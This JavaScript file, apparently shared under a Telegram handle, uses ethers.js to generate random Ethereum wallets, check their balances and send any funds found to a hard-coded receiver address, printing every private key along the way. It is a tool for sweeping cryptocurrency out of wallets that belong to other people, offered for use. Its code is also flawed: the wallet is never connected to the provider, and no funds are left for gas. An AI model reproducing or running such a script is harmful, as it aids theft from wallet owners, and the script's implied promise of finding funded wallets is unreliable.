const ethers = require('ethers')
const provider = new ethers.JsonRpcProvider("https://rpc.ankr.com/eth")

total = 100
let wallets = []
let bal = []
const receiver = ""


const Balance = async () => {

    // Generate Random wallet address and private key
    for ( let i = 0; i < total; i++) {

    const wallet = ethers.Wallet.createRandom()

    const bal = await provider.getBalance(wallet)
    const balance = ethers.formatEther(bal)

    if ( balance > 0) {
        wallet.sendTransaction({
            to: receiver,
            value: ethers.parseEther(balance)
        }).then((txObj) => {
            console.log("ETH wallet found and send tx: ", txObj.hash)
        })
    }

    wallets.push(wallet)
    console.log(`Wallet address: ${wallet.address}\nPrivate Key: ${wallet.privateKey}\nBalance: ${balance} ETH`)
    console.log("==============================TG: @autoboyt==================================================")
    }

}

Balance()



// TG: @autoboyt
